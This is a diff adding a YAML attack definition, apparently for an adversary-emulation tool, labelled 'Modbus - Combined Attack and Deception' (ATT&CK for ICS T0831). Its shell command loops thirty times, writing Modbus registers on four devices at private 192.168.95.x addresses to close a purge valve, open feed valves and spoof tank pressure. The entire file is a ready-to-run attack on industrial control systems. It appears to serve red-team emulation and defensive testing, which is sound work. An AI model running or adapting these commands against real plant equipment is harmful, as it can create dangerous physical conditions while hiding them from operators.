@@ -1,0 +1,25 @@
+---
+
+- id: c3d4e5f6-3333-3333-3333-000000000003
+  name: Modbus - Combined Attack and Deception
+  description: |
+    Close purge, open feeds, and spoof tank pressure simultaneously.
+    Uses simple for loop instead of shell functions.
+  tactic: impact
+  technique_id: T0831
+  technique_name: Manipulation of Control
+  executors:
+  - platform: linux
+    name: sh
+    command: >
+      for i in $(seq 1 30); do
+        ./modbus_cli 192.168.95.12 --port 502 write_r 1 0 2>/dev/null;
+        ./modbus_cli 192.168.95.10 --port 502 write_r 1 65535 2>/dev/null;
+        ./modbus_cli 192.168.95.11 --port 502 write_r 1 65535 2>/dev/null;
+        ./modbus_cli 192.168.95.14 --port 502 write_r 1 50000 2>/dev/null;
+        sleep 0.2;
+      done &&
+      echo "COMBINED_ATTACK_COMPLETE"
+    payloads:
+    - modbus_cli
+    timeout: 120
